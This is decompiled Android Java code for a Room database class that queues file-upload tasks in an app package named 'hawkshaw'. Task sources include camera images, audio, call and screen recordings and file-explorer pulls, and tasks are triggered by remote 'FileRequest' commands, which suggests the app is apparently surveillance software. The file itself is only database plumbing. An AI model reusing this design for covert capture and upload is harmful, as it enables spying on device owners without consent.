package com.hawkshaw.library.datalayer.room.files;

import C1.a;
import C1.b;
import C1.c;
import C1.d;
import C1.f;
import C1.g;
import C1.h;
import C1.k;
import C1.l;
import a3.e;
import android.os.CancellationSignal;
import androidx.room.A;
import androidx.room.C0276g;
import androidx.room.D;
import androidx.room.F;
import androidx.room.i;
import androidx.room.j;
import com.hawkshaw.library.datalayer.models.Command;
import java.util.Collections;
import java.util.List;
import s.C0933b;

public final class PushFileTaskDao_Impl implements PushFileTaskDao {
    /* access modifiers changed from: private */
    public final A __db;
    /* access modifiers changed from: private */
    public final i __deletionAdapterOfPushFileTaskEntity;
    /* access modifiers changed from: private */
    public final j __insertionAdapterOfPushFileTaskEntity;
    /* access modifiers changed from: private */
    public final F __preparedStmtOfDelete;
    /* access modifiers changed from: private */
    public final F __preparedStmtOfIncrementPriority;
    /* access modifiers changed from: private */
    public final F __preparedStmtOfNukeTable;
    /* access modifiers changed from: private */
    public final F __preparedStmtOfSetLastPushTimestamp;
    /* access modifiers changed from: private */
    public final i __updateAdapterOfPushFileTaskEntity;

    public PushFileTaskDao_Impl(A a5) {
        this.__db = a5;
        this.__insertionAdapterOfPushFileTaskEntity = new C1.i(this, a5);
        this.__deletionAdapterOfPushFileTaskEntity = new C1.j(this, a5, 0);
        this.__updateAdapterOfPushFileTaskEntity = new k(this, a5);
        this.__preparedStmtOfDelete = new l(a5, 0);
        this.__preparedStmtOfIncrementPriority = new l(a5, 1);
        this.__preparedStmtOfSetLastPushTimestamp = new l(a5, 2);
        this.__preparedStmtOfNukeTable = new l(a5, 3);
    }

    /* access modifiers changed from: private */
    public String __Medium_enumToString(Command.FileRequest.Medium medium) {
        int i5 = h.f253b[medium.ordinal()];
        if (i5 == 1) {
            return "Tus";
        }
        if (i5 == 2) {
            return "Grpc";
        }
        throw new IllegalArgumentException("Can't convert enum to string, unknown enum value: " + medium);
    }

    /* access modifiers changed from: private */
    public Command.FileRequest.Medium __Medium_stringToEnum(String str) {
        str.getClass();
        if (str.equals("Tus")) {
            return Command.FileRequest.Medium.Tus;
        }
        if (str.equals("Grpc")) {
            return Command.FileRequest.Medium.Grpc;
        }
        throw new IllegalArgumentException("Can't convert value to enum, unknown value: ".concat(str));
    }

    /* access modifiers changed from: private */
    public String __Source_enumToString(Command.FileRequest.Source source) {
        switch (h.f252a[source.ordinal()]) {
            case 1:
                return "CameraImage";
            case 2:
                return "VideoRecording";
            case 3:
                return "AudioRecording";
            case 4:
                return "Screenshot";
            case 5:
                return "ScreenRecording";
            case 6:
                return "FileExplorer";
            case 7:
                return "CallRecording";
            default:
                throw new IllegalArgumentException("Can't convert enum to string, unknown enum value: " + source);
        }
    }

    /* access modifiers changed from: private */
    public Command.FileRequest.Source __Source_stringToEnum(String str) {
        str.getClass();
        char c5 = 65535;
        switch (str.hashCode()) {
            case -588460778:
                if (str.equals("CameraImage")) {
                    c5 = 0;
                    break;
                }
                break;
            case -390324973:
                if (str.equals("CallRecording")) {
                    c5 = 1;
                    break;
                }
                break;
            case 216448731:
                if (str.equals("AudioRecording")) {
                    c5 = 2;
                    break;
                }
                break;
            case 308359126:
                if (str.equals("VideoRecording")) {
                    c5 = 3;
                    break;
                }
                break;
            case 583749317:
                if (str.equals("ScreenRecording")) {
                    c5 = 4;
                    break;
                }
                break;
            case 1262340603:
                if (str.equals("FileExplorer")) {
                    c5 = 5;
                    break;
                }
                break;
            case 1577017734:
                if (str.equals("Screenshot")) {
                    c5 = 6;
                    break;
                }
                break;
        }
        switch (c5) {
            case 0:
                return Command.FileRequest.Source.CameraImage;
            case 1:
                return Command.FileRequest.Source.CallRecording;
            case 2:
                return Command.FileRequest.Source.AudioRecording;
            case 3:
                return Command.FileRequest.Source.VideoRecording;
            case 4:
                return Command.FileRequest.Source.ScreenRecording;
            case 5:
                return Command.FileRequest.Source.FileExplorer;
            case 6:
                return Command.FileRequest.Source.Screenshot;
            default:
                throw new IllegalArgumentException("Can't convert value to enum, unknown value: ".concat(str));
        }
    }

    public static List<Class<?>> getRequiredConverters() {
        return Collections.emptyList();
    }

    public Object getAllTasks(e eVar) {
        D e5 = D.e(0, "SELECT * from PushFileTaskEntity");
        return C0276g.a(this.__db, new CancellationSignal(), new g(this, e5), eVar);
    }

    public Object getTopTask(e eVar) {
        D e5 = D.e(0, "SELECT * from PushFileTaskEntity ORDER BY priority, id DESC LIMIT 1");
        return C0276g.a(this.__db, new CancellationSignal(), new C1.e(this, e5), eVar);
    }

    public Object incrementPriority(int i5, e eVar) {
        return C0276g.b(this.__db, new b(this, i5, 1), eVar);
    }

    public Object nukeTable(e eVar) {
        return C0276g.b(this.__db, new d(this, 0), eVar);
    }

    public Object setLastPushTimestamp(int i5, long j5, e eVar) {
        return C0276g.b(this.__db, new c(this, j5, i5), eVar);
    }

    public Object delete(PushFileTaskEntity pushFileTaskEntity, e eVar) {
        return C0276g.b(this.__db, new C0933b(1, this, pushFileTaskEntity), eVar);
    }

    public Object deleteAll(PushFileTaskEntity[] pushFileTaskEntityArr, e eVar) {
        return C0276g.b(this.__db, new a(this, pushFileTaskEntityArr, 0), eVar);
    }

    public Object insert(PushFileTaskEntity[] pushFileTaskEntityArr, e eVar) {
        return C0276g.b(this.__db, new a(this, pushFileTaskEntityArr, 2), eVar);
    }

    public void insertSync(PushFileTaskEntity... pushFileTaskEntityArr) {
        this.__db.assertNotSuspendingTransaction();
        this.__db.beginTransaction();
        try {
            this.__insertionAdapterOfPushFileTaskEntity.f(pushFileTaskEntityArr);
            this.__db.setTransactionSuccessful();
        } finally {
            this.__db.endTransaction();
        }
    }

    public Object update(PushFileTaskEntity[] pushFileTaskEntityArr, e eVar) {
        return C0276g.b(this.__db, new a(this, pushFileTaskEntityArr, 1), eVar);
    }

    public void updateSync(PushFileTaskEntity... pushFileTaskEntityArr) {
        this.__db.assertNotSuspendingTransaction();
        this.__db.beginTransaction();
        try {
            this.__updateAdapterOfPushFileTaskEntity.f(pushFileTaskEntityArr);
            this.__db.setTransactionSuccessful();
        } finally {
            this.__db.endTransaction();
        }
    }

    public Object delete(int i5, e eVar) {
        return C0276g.b(this.__db, new b(this, i5, 0), eVar);
    }

    public Object getTopTask(int i5, e eVar) {
        D e5 = D.e(1, "SELECT * from PushFileTaskEntity WHERE length <= ? ORDER BY priority, id DESC LIMIT 1");
        e5.L(1, (long) i5);
        return C0276g.a(this.__db, new CancellationSignal(), new f(this, e5), eVar);
    }
}
